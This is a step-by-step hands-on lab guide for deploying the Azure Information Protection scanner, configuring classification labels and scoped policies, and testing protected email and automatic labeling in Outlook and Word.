Now that you have installed the scanner bits, you need to get an Azure AD token for the scanner service account to authenticate so that it can run unattended. This requires registering both a Web app and a Native app in Azure Active Directory.  The commands below will do this in an automated fashion rather than needing to go into the Azure portal directly.

1. [] In PowerShell, run ```Connect-AzureAD``` and use the username and password below. 
	
	```@lab.CloudCredential(134).Username```
	
	```@lab.CloudCredential(134).Password```
1. [] Next, click the **T** to **type the commands below** in the PowerShell window. 

	> [!ALERT] Press Enter only after you see **-CustomKeyIdentifier "AIPClient"**.

	> [!NOTE] This will create a new Web App Registration and Service Principal in Azure AD.

   ```
   New-AzureADApplication -DisplayName AIPOnBehalfOf -ReplyUrls http://localhost
   $WebApp = Get-AzureADApplication -Filter "DisplayName eq 'AIPOnBehalfOf'"
   New-AzureADServicePrincipal -AppId $WebApp.AppId
   $WebAppKey = New-Guid
   $Date = Get-Date
   New-AzureADApplicationPasswordCredential -ObjectId $WebApp.ObjectID -startDate $Date -endDate $Date.AddYears(1) -Value $WebAppKey.Guid -CustomKeyIdentifier "AIPClient"
	```

1. [] Next, we must build the permissions object for the Native App Registration.  This is done using the commands below.
   
	> [!ALERT] Press Enter only after you see **$Access.ResourceAccess = $Scope**.

   ```
   $AIPServicePrincipal = Get-AzureADServicePrincipal -All $true | ? {$_.DisplayName -eq 'AIPOnBehalfOf'}
   $AIPPermissions = $AIPServicePrincipal | select -expand Oauth2Permissions
   $Scope = New-Object -TypeName "Microsoft.Open.AzureAD.Model.ResourceAccess" -ArgumentList $AIPPermissions.Id,"Scope"
   $Access = New-Object -TypeName "Microsoft.Open.AzureAD.Model.RequiredResourceAccess"
   $Access.ResourceAppId = $WebApp.AppId
   $Access.ResourceAccess = $Scope
	```
1. [] Next, we will use the object created above to create the Native App Registration.
   
	> [!ALERT] Press Enter only after you see **-AppId $NativeApp.AppId**.

   ```
   New-AzureADApplication -DisplayName AIPClient -ReplyURLs http://localhost -RequiredResourceAccess $Access -PublicClient $true
   $NativeApp = Get-AzureADApplication -Filter "DisplayName eq 'AIPClient'"
   New-AzureADServicePrincipal -AppId $NativeApp.AppId
	```
   
1. [] Finally, we will output the Set-AIPAuthentication command by running the commands below and pressing **Enter**.
   
	> [!ALERT] Press Enter only after you see **Start ~\Desktop\Set-AIPAuthentication.txt**.
   
   ```
   "Set-AIPAuthentication -WebAppID " + $WebApp.AppId + " -WebAppKey " + $WebAppKey.Guid + " -NativeAppID " + $NativeApp.AppId | Out-File ~\Desktop\Set-AIPAuthentication.txt
	Start ~\Desktop\Set-AIPAuthentication.txt
	```
1. [] In the new notepad window, copy the command to the clipboard.
1. [] Click on the Start menu and type ```PowerShell```, right-click on the PowerShell program, and click **Run as a different user**.

	!IMAGE[zgt5ikxl.jpg](\Media\zgt5ikxl.jpg)

1. [] When prompted, enter the username and password below and click **OK**.

	```Contoso\AIPScanner``` 

	```Somepass1```

1. [] Paste the copied **Set-AIPAuthentication** command into this window and run it.
1. [] When prompted, enter the username and password below:

	```AIPScanner@@lab.CloudCredential(134).TenantName```

	```Somepass1```

	^IMAGE[Open Screenshot](\Media\qfxn64vb.jpg)

1. [] In the Permissions requested window, click **Accept**.

   !IMAGE[nucv27wb.jpg](\Media\nucv27wb.jpg)
   
	>[!knowledge] You will a message like the one below in the PowerShell window once complete.
	>
	>!IMAGE[y2bgsabe.jpg](\Media\y2bgsabe.jpg)
1. [] **Close the current PowerShell window**.
1. [] **In the admin PowerShell window** and type the command below and press **Enter**.

	```Restart-Service AIPScanner```
   
===

# Configuring Repositories
[:arrow_left: Home](#azure-information-protection)

In this task, we will configure repositories to be scanned by the AIP scanner.  As previously mentioned, these can be any type of CIFS file shares including NAS devices sharing over the CIFS protocol.  Additionally, On premises SharePoint 2010, 2013, and 2016 document libraries and lists (attachements) can be scanned.  You can even scan entire SharePoint sites by providing the root URL of the site.  There are several optional 

> [!NOTE] SharePoint 2010 is only supported for customers who have extended support for that version of SharePoint.

The next task is to configure repositories to scan.  These can be on-premises SharePoint 2010, 2013, or 2016 document libraries and any accessible CIFS based share.

1. [] In the PowerShell window on Scanner01 run the commands below

    ```
    Add-AIPScannerRepository -Path http://Scanner01/documents -SetDefaultLabel Off
	```
	```
	Add-AIPScannerRepository -Path \\Scanner01\documents -SetDefaultLabel Off
    ```
	>[!Knowledge] Notice that we added the **-SetDefaultLabel Off** switch to each of these repositories.  This is necessary because our Global policy has a Default label of **General**.  If we did not add this switch, any file that did not match a condition would be labeled as General when we do the enforced scan.

	^IMAGE[Open Screenshot](\Media\00niixfd.jpg)
1. [] To verify the repositories configured, run the command below.
	
    ```
    Get-AIPScannerRepository
    ```
	^IMAGE[Open Screenshot](\Media\n5hj5e7j.jpg)

===

# Running Sensitive Data Discovery
[:arrow_left: Home](#azure-information-protection)

1. [] Run the commands below to run a discovery cycle.

    ```
	Set-AIPScannerConfiguration -DiscoverInformationTypes All -Enforce Off
	```
	```
	Start-AIPScan
    ```

	> [!Knowledge] Note that we used the DiscoverInformationTypes -All switch before starting the scan.  This causes the scanner to use any custom conditions that you have specified for labels in the Azure Information Protection policy, and the list of information types that are available to specify for labels in the Azure Information Protection policy.  Although the scanner will discover documents to classify, it will not do so because the default configuration for the scanner is Discover only mode.
 	
1. [] Right-click on the **Windows** button in the lower left-hand corner and click on **Event Viewer**.
 
	^IMAGE[Open Screenshot](\Media\cjvmhaf0.jpg)
1. [] Expand **Application and Services Logs** and click on **Azure Information Protection**.

	^IMAGE[Open Screenshot](\Media\dy6mnnpv.jpg)
 
	>[!NOTE] You will see an event like the one below when the scanner completes the cycle.
	>
	>!IMAGE[agnx2gws.jpg](\Media\agnx2gws.jpg)
 
1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open a **File Explorer** window, and browse to ```\\\Scanner01.contoso.azure\c$\users\aipscanner\AppData\Local\Microsoft\MSIP\Scanner\Reports```.

	> If needed, use the credentials below:
	>
	>```Contoso\LabUser```
	>
	>```Pa$$w0rd```

1. [] Review the summary txt and detailed csv files available there.  

	>[!Hint] Since there are no Automatic conditions configured yet, the scanner found no matches for the 141 files scanned despite 136 of them having sensitive data.
	>
	>!IMAGE[aukjn7zr.jpg](\Media\aukjn7zr.jpg)
	>
	>The details contained in the DetailedReport.csv can be used to identify the types of sensitive data you need to create AIP rules for in the Azure Portal.
	>
	>!IMAGE[9y52ab7u.jpg](\Media\9y52ab7u.jpg)

	>[!NOTE] We will revisit this information later in the lab to review discovered data and create Sensitive Data Type to Classification mappings.

===

# Exercise 2: Configuring Azure Information Protection Policy
[:arrow_left: Home](#azure-information-protection)

This exercise demonstrates using the Azure Information Protection blade in the Azure portal to configure policies and sub-labels.  We will create a new sub-label and configure protection and then modify an existing sub-label.  We will also create a label that will be scoped to a specific group.  

Next, we will configure AIP Global Policy to use the General sub-label as default, and finally, we will configure a scoped policy to use the new scoped label by default for Word, Excel, and PowerPoint while still using General as default for Outlook.
===
# Creating, Configuring, and Modifying Sub-Labels
[:arrow_left: Home](#azure-information-protection)

In this task, we will configure a label protected for internal audiences that can be used to help secure sensitive data within your company.  By limiting the audience of a specific label to only internal employees, you can dramatically reduce the risk of unintentional disclosure of sensitive data and help reduce the risk of successful data exfiltration by bad actors.  

However, there are times when external collaboration is required, so we will configure a label to match the name and functionality of the Do Not Forward button in Outlook.  This will allow users to more securely share sensitive information outside the company to any recipient.  By using the name Do Not Forward, the functionality will also be familiar to what previous users of AD RMS or Azure RMS may have used in the past.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In the Azure Information Protection blade, under **Classifications** in the left pane, click on **Labels** to load the Azure Information Protection – Labels blade.

	^IMAGE[Open Screenshot](\Media\mhocvtih.jpg)

1. [] In the Azure Information Protection – Labels blade, right-click on **Confidential** and click **Add a sub-label**.

	^IMAGE[Open Screenshot](\Media\uktfuwuk.jpg)

1. [] In the Sub-label blade, type ```Contoso Internal``` for the **Label display name** and for **Description** enter text similar to ```Confidential data that requires protection, which allows Contoso Internal employees full permissions. Data owners can track and revoke content.```

	^IMAGE[Open Screenshot](\Media\4luorc0u.jpg)

1. [] Then, under **Set permissions for documents and emails containing this label**, click **Protect**, and under **Protection**, click on **Azure (cloud key)**.

	^IMAGE[Open Screenshot](\Media\tp97a19d.jpg)

1. [] In the Protection blade, click **+ Add Permissions**.

	^IMAGE[Open Screenshot](\Media\layb2pvo.jpg)

1. [] In the Add permissions blade, click on **+ Add contoso – All members** and click **OK**.

	^IMAGE[Open Screenshot](\Media\zc0iuoyz.jpg)

1. [] In the Protection blade, click **OK**.

	^IMAGE[Open Screenshot](\Media\u8jv46zo.jpg)

1. [] In the Sub-label blade, scroll down to the **Set visual marking (such as header or footer)** section and under **Documents with this label have a header**, click **On**.

	> Use the values in the table below to configure the Header.

	| Setting          | Value            |
	|:-----------------|:-----------------|
	| Header text      | ```Contoso Internal``` |
	| Header font size | ```24```               |
	| Header color     | Purple           |
	| Header alignment | Center           |

	> [!NOTE] These are sample values to demonstrate marking possibilities and **NOT** a best practice.

	^IMAGE[Open Screenshot](\Media\0vdoc6qb.jpg)

1. [] To complete creation of the new sub-label, click the **Save** button and then click **OK** in the Save settings dialog.

	^IMAGE[Open Screenshot](\Media\89nk9deu.jpg)

1. [] In the Azure Information Protection - Labels blade, expand **Confidential** (if necessary) and then click on **Recipients Only**.

	^IMAGE[Open Screenshot](\Media\eiiw5zbg.jpg)

1. [] In the Label: Recipients Only blade, change the **Label display name** from **Recipients Only** to ```Do Not Forward```.

	^IMAGE[Open Screenshot](\Media\v54vd4fq.jpg)

1. [] Next, in the **Set permissions for documents and emails containing this label** section, under **Protection**, click **Azure (cloud key): User defined**.

	^IMAGE[Open Screenshot](\Media\qwyranz0.jpg)

1. [] In the Protection blade, under **Set user-defined permissions (Preview)**, verify that only the box next to **In Outlook apply Do Not Forward** is checked, then click **OK**.

	^IMAGE[Open Screenshot](\Media\16.png)

	> [!knowledge] Although there is no action added during this step, it is included to show that this label will only display in Outlook and not in Word, Excel, PowerPoint or File Explorer.

1. [] Click **Save** in the Label: Recipients Only blade and **OK** to the Save settings prompt. 

	^IMAGE[Open Screenshot](\Media\9spkl24i.jpg)

1. []  Click the **X** in the upper right corner of the blade to close.

	^IMAGE[Open Screenshot](\Media\98pvhwdv.jpg)

===

# Configuring Global Policy
[:arrow_left: Home](#azure-information-protection)

In this task, we will assign the new sub-label to the Global policy and configure several global policy settings that will increase Azure Information Protection adoption among your users and reduce ambiguity in the user interface.

1. [] In the Azure Information Protection blade, under **Classifications** on the left, click **Policies** then click the **Global** policy.

	^IMAGE[Open Screenshot](\Media\24qjajs5.jpg)

1. [] In the Policy: Global blade, **wait for the labels to load**.

1. [] Below the labels, click **Add or remove labels**.

1. [] In the Policy: Add or remove labels blade, ensure that the boxes next to all Labels are checked and click **OK**.

1. [] In the Policy: Global blade, under the **Configure settings to display and apply on Information Protection end users** section, configure the policy to match the settings shown in the table and image below.

	| Setting | Value |
	|:--------|:------|
	| Select the default label | General |
	|All documents and emails must have a label…|On
	Users must provide justification to set a lower…|On
	For email messages with attachments, apply a label…|Automatic
	Add the Do Not Forward button to the Outlook ribbon|Off

	!IMAGE[Open Screenshot](\Media\mtqhe3sj.jpg)

1. [] Click **Save**, then **OK** to complete configuration of the Global policy.

	^IMAGE[Open Screenshot](\Media\1p1q4pxe.jpg)

1. [] Click the **X** in the upper right corner to close the Policy: Global blade.

	^IMAGE[Open Screenshot](\Media\m6e4r2u2.jpg)

===

# Creating a Scoped Label and Policy
[:arrow_left: Home](#azure-information-protection)

Now that you have learned how to work with global labels and policies, we will create a new scoped label and policy for the Legal team at Contoso.  

1. [] Under **Classifications** on the left, click **Labels**.

	^IMAGE[Open Screenshot](\Media\50joijwb.jpg)

1. [] In the Azure Information Protection – Labels blade, right-click on **Highly-Confidential** and click **Add a sub-label**.

	^IMAGE[Open Screenshot](\Media\tasz9t0i.jpg)

1. [] In the Sub-label blade, enter ```Legal Only``` for the **Label display name** and for **Description** enter ```Data is classified and protected. Legal department staff can edit, forward and unprotect.```.

	^IMAGE[Open Screenshot](\Media\lpvruk49.jpg)

1. [] Then, under **Set permissions for documents and emails containing this label**, click **Protect** and under **Protection**, click **Azure (cloud key)**.

	^IMAGE[Open Screenshot](\Media\6ood4jqu.jpg)

1. [] In the Protection blade, under **Protection settings**, click the **+ Add permissions** link.

	!IMAGE[ozzumi7l.jpg](\Media\ozzumi7l.jpg)

1. [] In the Add permissions blade, click **+ Browse directory**.

	^IMAGE[Open Screenshot](\Media\2lvwim24.jpg)

1. [] In the AAD Users and Groups blade, **wait for the names to load**, then check the boxes next to **Adam Smith** and **Alice Anderson**, and click the **Select** button.

	^IMAGE[Open Screenshot](\Media\uishk9yh.jpg)

	> [!Note] In a production environment, you will typically use a synced or Azure AD Group rather than choosing individuals.

1. [] In the Add permissions blade, click **OK**.

	^IMAGE[Open Screenshot](\Media\stvnaf4f.jpg)

1. [] In the Protection blade, under **Allow offline access**, reduce the **Number of days the content is available without an Internet connection** value to ```3``` and press **OK** .

	> [!Knowledge] This value determines how many days a user will have offline access from the time a document is opened, and an initial Use License is acquired.  While this provides convenience for users, it is recommended that this value be set appropriately based on the sensitivity of the content.

	^IMAGE[Open Screenshot](\Media\j8masv1q.jpg)

1. [] Click **Save** in the Sub-label blade and **OK** to the Save settings prompt to complete the creation of the Legal Only sub-label.

	^IMAGE[Open Screenshot](\Media\dfhoii1x.jpg)

1. [] In the Azure Information Protection blade, under **Classifications** on the left, click **Policies** then click the **+Add a new policy** link.

	^IMAGE[Open Screenshot](\Media\ospsddz6.jpg)

1. [] In the Policy blade, for Policy name, type ```No Default Label Scoped Policy``` and click on **Select which users or groups get this policy. Groups must be email-enabled.**

	!IMAGE[1sjw3mc7.jpg](\Media\1sjw3mc7.jpg)

1. [] In the AAD Users and Groups blade, click on **Users/Groups**.  
1. [] Then in the second AAD Users and Groups blade, **wait for the names to load** and check the boxes next to **AIPScanner**, **Adam Smith**, and **Alice Anderson**.

	>[!NOTE] The **AIPScanner** account is added here to prevent all scanned documents from being labeled with a default label.
1. [] Click the **Select** button.
1. [] Finally, click **OK**.

	^IMAGE[Open Screenshot](\Media\onne7won.jpg)

1. [] In the Policy blade, under the labels, click on **Add or remove labels** to add the scoped label.

	!IMAGE[b6e9nbui.jpg](\Media\b6e9nbui.jpg)

1. [] In the Policy: Add or remove labels blade, check the box next to **Legal Only** and click **OK**.

	^IMAGE[Open Screenshot](\Media\c2429kv9.jpg)

1. [] In the Policy blade, under **Configure settings to display and apply on Information Protection end users** section, under **Select the default label**, select **None** as the default label for this scoped policy.

	!IMAGE[4mxceage.jpg](\Media\4mxceage.jpg)

1. [] Click **Save**, then **OK** to complete creation of the No Default Label Scoped Policy.

	^IMAGE[Open Screenshot](\Media\41jembjf.jpg)

1. [] Click on the **X** in the upper right-hand corner to close the policy.

===

# Configuring Advanced Policy Settings
[:arrow_left: Home](#azure-information-protection)

There are many advanced policy settings that are useful to tailor your Azure Information Protection deployment to the needs of your environment.  In this task, we will cover one of the settings that is very complimentary when using scoped policies that have no default label or a protected default label.  Because the No Default Label Scoped Policy we created in the previous task uses a protected default label, we will be adding an alternate default label for Outlook to provide a more palatable user experience for those users.

1. [] In the Azure Information Protection blade, under **Classifications** on the left, click on **Labels** and then click on the **General** label.

    ^IMAGE[Open Screenshot](\Media\rvn4xorx.jpg)

1. [] In the Label: General blade, scroll to the bottom and copy the **Label ID** and close the blade using the **X** in the upper right-hand corner.

    !IMAGE[8fi1wr4d.jpg](\Media\8fi1wr4d.jpg)

1. [] In the AIP Portal, under **Classifications** on the left, click on **Policies**. 
1. [] **Right-click** on the **No Default Label Scoped Policy** and click on **Advanced settings**.

    ^IMAGE[Open Screenshot](\Media\2jo71ugb.jpg)

1. [] In the Advanced settings blade, in the textbox under **NAME**, type ```OutlookDefaultLabel```.  In the textbox under **VALUE**, paste the **Label ID** for the **General** label you copied previously, then click **Save and close**.

    > [!ALERT] CAUTION: Please check to ensure that there are **no spaces** before or after the **Label ID** when pasting as this will cause the setting to not apply.

    !IMAGE[ezt8sfs3.jpg](\Media\ezt8sfs3.jpg)

	> [!HINT] This and additional Advanced Policy Settings can be found at [https://docs.microsoft.com/en-us/azure/information-protection/rms-client/client-admin-guide-customizations ](https://docs.microsoft.com/en-us/azure/information-protection/rms-client/client-admin-guide-customizations)

===

# Defining Recommended and Automatic Conditions
[:arrow_left: Home](#azure-information-protection)

One of the most powerful features of Azure Information Protection is the ability to guide your users in making sound decisions around safeguarding sensitive data.  This can be achieved in many ways through user education or reactive events such as blocking emails containing sensitive data. 

However, helping your users to properly classify and protect sensitive data at the time of creation is a more organic user experience that will achieve better results long term.  In this task, we will define some basic recommended and automatic conditions that will trigger based on certain types of sensitive data.

1. [] Under **Dashboards** on the left, click on **Data discovery (Preview)** to view the results of the discovery scan we performed previously.

	!IMAGE[Dashboard.png](\Media\Dashboard.png)

	> [!KNOWLEDGE] Notice that there are no labeled or protected files shown at this time.  This uses the AIP P1 discovery functionality available with the AIP Scanner. Only the predefined Office 365 Sensitive Information Types are available with AIP P1 as Custom Sensitive Information Types require automatic conditions to be defined, which is an AIP P2 feature.

	> [!NOTE] Now that we know the sensitive information types that are most common in this environment, we can use that information to create **Recommended** conditions that will help guide user behavior when they encounter this type of data.

1. [] Under **Classifications** on the left, click **Labels** then expand **Confidential**, and click on **Contoso Internal**.

	^IMAGE[Open Screenshot](\Media\jyw5vrit.jpg)
1. [] In the Label: Contoso Internal blade, scroll down to the **Configure conditions for automatically applying this label** section, and click on **+ Add a new condition**.

	!IMAGE[cws1ptfd.jpg](\Media\cws1ptfd.jpg)
1. [] In the Condition blade, in the **Select information types** search box, type ```EU``` and check the boxes next to the **items shown below**.

	!IMAGE[xaj5hupc.jpg](\Media\xaj5hupc.jpg)
1. [] Next, before saving, replace EU in the search bar with ```credit``` and check the box next to **Credit Card Number**.

	^IMAGE[Open Screenshot](\Media\9rozp61b.jpg)
1. [] Click **Save** in the Condition blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\41o5ql2y.jpg)

	> [!Knowledge] By default the condition is set to Recommended and a policy tip is created with standardized text.
	>
	>  !IMAGE[qdqjnhki.jpg](\Media\qdqjnhki.jpg)

1. [] Click **Save** in the Label: Contoso Internal blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\rimezmh1.jpg)
1. [] Press the **X** in the upper right-hand corner to close the Label: Contoso Internal blade.

	^IMAGE[Open Screenshot](\Media\em124f66.jpg)
1. [] Next, expand **Highly Confidential** and click on the **All Employees** sub-label.

	^IMAGE[Open Screenshot](\Media\2eh6ifj5.jpg)
1. [] In the Label: All Employees blade, scroll down to the **Configure conditions for automatically applying this label** section, and click on **+ Add a new condition**.

	^IMAGE[Open Screenshot](\Media\8cdmltcj.jpg)
1. [] In the Condition blade, select the **Custom** tab and enter ```Password``` for the **Name** and in the textbox below **Match exact phrase or pattern**, type ```pass@word1```.

	!IMAGE[ra7dnyg6.jpg](\Media\ra7dnyg6.jpg)
1. [] Click **Save** in the Condition blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\ie6g5kta.jpg)
1. [] In the Labels: All Employees blade, in the **Configure conditions for automatically applying this label** section, click **Automatic**.

	!IMAGE[245lpjvk.jpg](\Media\245lpjvk.jpg)
	> [!HINT] The policy tip is automatically updated when you switch the condition to Automatic.
1. [] Click **Save** in the Label: All Employees blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\gek63ks8.jpg)
1. [] Press the **X** in the upper right-hand corner to close the Label: All Employees blade.

	^IMAGE[Open Screenshot](\Media\wzwfc1l4.jpg)

===

# Exercise 3: Security and Compliance Center
[:arrow_left: Home](#azure-information-protection)

In this exercise, we will migrate your AIP Labels and activate them in the Security and Compliance Center.  This will allow you to see the labels in Microsoft Information Protection based clients such as Office 365 for Mac and Mobile Devices.

Although we will not be demonstrating these capabilities in this lab, you can use the tenant information provided to test on your own devices.
 

===
# Activating Unified Labeling
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will activate the labels from the Azure Portal for use in the Security and Compliance Center.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Navigate to ```https://portal.azure.com/?ActivateMigration=true#blade/Microsoft_Azure_InformationProtection/DataClassGroupEditBlade/migrationActivationBlade```

1. [] Click **Activate** and **Yes**.

	!IMAGE[o0ahpimw.jpg](\Media\o0ahpimw.jpg)

	>[!NOTE] You should see a message similar to the one below.
	>
	> !IMAGE[SCCMigration.png](\Media\SCCMigration.png) 

1. [] In a new tab, browse to ```https://protection.office.com/``` and click on **Classifications** and **Labels** to review the migrated labels. 

	>[!NOTE] Keep in mind that now the SCC Sensitivity Labels have been activated, so any modifications, additions, or deletions will be syncronised to Azure Information Protection in the Azure Portal. There are some functional differences between the two sections (DLP in SCC, HYOK & Custom Permissions in AIP), so please be aware of this when modifying policies to ensure a consistent experience on clients. 

===

# Exercise 4: Testing AIP Policies
[:arrow_left: Home](#azure-information-protection)

Now that you have 3 test systems with users being affected by different policies configured, we can start testing these policies.  This exercise will run through various scenarios to demonstrate the use of AIP global and scoped policies and show the functionality of recommended and automatic labeling.
===
# Testing User Defined Permissions
[:arrow_left: Home](#azure-information-protection)

One of the most common use cases for AIP is the ability to send emails using User Defined Permissions (Do Not Forward). In this task, we will send an email using the Do Not Forward label to test that functionality.


1. [] On @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Launch Microsoft Outlook, and click **Accept and start Outlook**.
3. [] The username should auto-populate based on the workplace join we performed earlier.  Click **Connect**.
4. [] Once configuration completes, **uncheck the box** to **Set up Outlook Mobile** and click **OK**.
5. [] **Close Outlook** and **reopen** to complete activation.
6. [] Once Outlook opens, click on the **New email** button.

	!IMAGE[6wan9me1.jpg](\Media\6wan9me1.jpg)

	> [!KNOWLEDGE] Note that the **Sensitivity** is set to **General** by default.
	>
	> !IMAGE[5esnhwkw.jpg](\Media\5esnhwkw.jpg)

1. [] Send an email to **Adam Smith** and **Alice Anderson** (```Adam Smith;Alice Anderson```). You may **optionally add an external email address** (preferably from a major social provider like gmail, yahoo, or outlook.com) to test the external recipient experience. For the **Subject** and **Body** type ```Test Do Not Forward Email```.

	^IMAGE[Open Screenshot](\Media\h0eh40nk.jpg)

1. [] In the Sensitivity Toolbar, click on the **pencil** icon to change the Sensitivity label.

	!IMAGE[901v6vpa.jpg](\Media\901v6vpa.jpg)

	> [!NOTE] If the AIP toolbar is not signed in, click **Sign In** and wait for it to use SSO and download policies (about 30 seconds).

1. [] Click on **Confidential** and then the **Do Not Forward** sub-label and click **Send**.

	!IMAGE[w8j1w1lm.jpg](\Media\w8j1w1lm.jpg)

	> [!Knowledge] If you receive the error message below, click on the Confidential \ Contoso Internal sub-label to force the download of your AIP identity certificates, then follow the steps above to change the label to Confidential \ Do Not Forward.
	>
	> !IMAGE[6v6duzbd.jpg](\Media\6v6duzbd.jpg)

1. [] Switch over to @lab.VirtualMachine(Client01).SelectLink or @lab.VirtualMachine(Client02).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
 
2. [] Open Outlook, run through setup, and review the email in Adam Smith or Alice Anderson’s Outlook.  You will notice that the email is automatically shown in Outlook natively.

	!IMAGE[0xby56qt.jpg](\Media\0xby56qt.jpg)

	> [!Hint] The **Do Not Forward** protection template will normally prevent the sharing of the screen and taking screenshots when protected documents or emails are loaded.  However, since this screenshot was taken within a VM, the operating system was unaware of the protected content and could not prevent the capture.  
	>
	>It is important to understand that although we put controls in place to reduce risk, if a user has view access to a document or email they can take a picture with their smartphone or even retype the message. That said, if the user is not authorized to read the message then it will not even render and we will demonstrate that next.

	> [!KNOWLEDGE] If you elected to send a Do Not Forward message to an external email, you will have an experience similar to the images below.  These captures are included to demonstrate the functionality for those that chose not to send an external message.
	>
	> !IMAGE[tzj04wi9.jpg](\Media\tzj04wi9.jpg)
	> 
	> Here the user has received an email from Evan Green and they can click on the **Read the message** button.
	>
	>!IMAGE[wiefwcho.jpg](\Media\wiefwcho.jpg)
	>
	>Next, the user is given the option to either log in using the social identity provider (**Sign in with Google**, Yahoo, Microsoft Account), or to **sign in with a one-time passcode**.
	>
	>If they choose the social identity provider login, it should use the token previously cached by their browser and display the message directly.
	>
	>If they choose one-time passcode, they will receive an email like the one below with the one-time passcode.
	>
	>!IMAGE[m6voa9xi.jpg](\Media\m6voa9xi.jpg)
	>
	>They can then use this code to authenticate to the Office 365 Message Encryption portal.
	>
	>!IMAGE[8pllxint.jpg](\Media\8pllxint.jpg)
	>
	>After using either of these authentication methods, the user will see a portal experience like the one shown below.
	>
	>!IMAGE[3zi4dlk9.jpg](\Media\3zi4dlk9.jpg)
===

# Testing Global Policy
[:arrow_left: Home](#azure-information-protection)

In this task, we will create a document and send an email to demonstrate the functionality defined in the Global Policy.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In Microsoft Outlook, click on the **New email** button.

	^IMAGE[Open Screenshot](\Media\6wan9me1.jpg)

1. [] Send an email to Adam Smith, Alice Anderson, and yourself (```Adam Smith;Alice Anderson;@lab.User.Email```).  For the **Subject** and **Body** type ```Test Contoso Internal Email```.

	^IMAGE[Open Screenshot](\Media\9gkqc9uy.jpg)

1. [] In the Sensitivity Toolbar, click on the **pencil** icon to change the Sensitivity label.

	^IMAGE[Open Screenshot](\Media\901v6vpa.jpg)

1. [] Click on **Confidential** and then **Contoso Internal** and click **Send**.

	^IMAGE[Open Screenshot](\Media\yhokhtkv.jpg)
1. [] On @lab.VirtualMachine(Client01).SelectLink or @lab.VirtualMachine(Client02).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.

2. [] Observe that you are able to open the email natively in the Outlook client. Also observe the **header text** that was defined in the label settings.

	!IMAGE[bxz190x2.jpg](\Media\bxz190x2.jpg)
	
1. [] In your email, note that you will be unable to open this message.  This experience will vary depending on the client you use (the image below is from Outlook 2016 for Mac) but they should have similar messages after presenting credentials. Since this is not the best experience for the recipient, later in the lab we will configure Exchange Online Mail Flow Rules to prevent content classified with internal only labels from being sent to external users.
	
	!IMAGE[52hpmj51.jpg](\Media\52hpmj51.jpg)

===

# Testing Scoped Policy
[:arrow_left: Home](#azure-information-protection)

In this task, we will create a document and send an email from one of the users in the Legal group to demonstrate the functionality defined in the first exercise. We will also show the behavior of the No Default Label policy on documents.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In Microsoft Outlook, click on the **New email** button.
	
	^IMAGE[Open Screenshot](\Media\ldjugk24.jpg)
	
1. [] Send an email to Alice Anderson and Evan Green (```Alice Anderson;Evan Green```).  For the **Subject** and **Body** type ```Test Highly Confidential Legal Email```.
1. [] In the Sensitivity Toolbar, click on **Highly Confidential** and the **Legal Only** sub-label, then click **Send**.

	^IMAGE[Open Screenshot](\Media\ny1lwv0h.jpg)
1. [] Switch to @lab.VirtualMachine(Client02).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Click on the email.  You should be able to open the message natively in the client as Alice.

	!IMAGE[qeqtd2yr.jpg](\Media\qeqtd2yr.jpg)
1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Click on the email. You should be unable to open the message as Evan.

	!IMAGE[6y99u8cl.jpg](\Media\6y99u8cl.jpg)

	> [!Knowledge] You may notice that the Office 365 Message Encryption wrapper message is displayed in the preview pane.  It is important to note that the content of the email is not displayed here.  The content of the message is contained within the encrypted message.rpmsg attachment and only authorized users will be able to decrypt this attachment.
	>
	>!IMAGE[w4npbt49.jpg](\Media\w4npbt49.jpg)
	>
	>If an unauthorized recipient clicks on **Read the message** to go to the OME portal, they will be presented with the same wrapper message.  Like the external recipient from the previous task, this is not an ideal experience. So, you may want to use a mail flow rule to manage scoped labels as well.
	>
	>!IMAGE[htjesqwe.jpg](\Media\htjesqwe.jpg)

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] O]pen **Microsoft Word**.
3. [] Create a new **Blank document** and type ```This is a test document``` and **save the document**.

	> [!ALERT] When you click **Save**, you will be prompted to choose a classification.  This is a result of having **None** set as the default label in the scoped policy while requiring all documents to be labeled.  This is a useful for driving **active classification decisions** by specific groups within your organization.  Notice that Outlook still has a default of **General** because of the Advanced setting we added to the scoped policy.  **This is recommended** because user send many more emails each day than they create documents. Actively forcing users to classify each email would be an unpleasant user experience whereas they are typically more understanding of having to classify each document if they are in a sensitive department or role.

1. [] Choose a classification to save the document.
===

# Testing Recommended and Automatic Classification
[:arrow_left: Home](#azure-information-protection)

In this task, we will test the configured recommended and automatic conditions we defined in Exercise 1.  Recommended conditions can be used to help organically train your users to classify sensitive data appropriately and provides a method for testing the accuracy of your dectections prior to switching to automatic classification.  Automatic conditions should be used after thorough testing or with items you are certain need to be protected. Although the examples used here are fairly simple, in production these could be based on complex regex statements or only trigger when a specific quantity of sensitive data is present.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Launch **Microsoft Word**.
3. [] In Microsoft Word, create a new **Blank document** and type ```My AMEX card number is 344047014854133. The expiration date is 09/28, and the CVV is 4368``` and **save** the document.

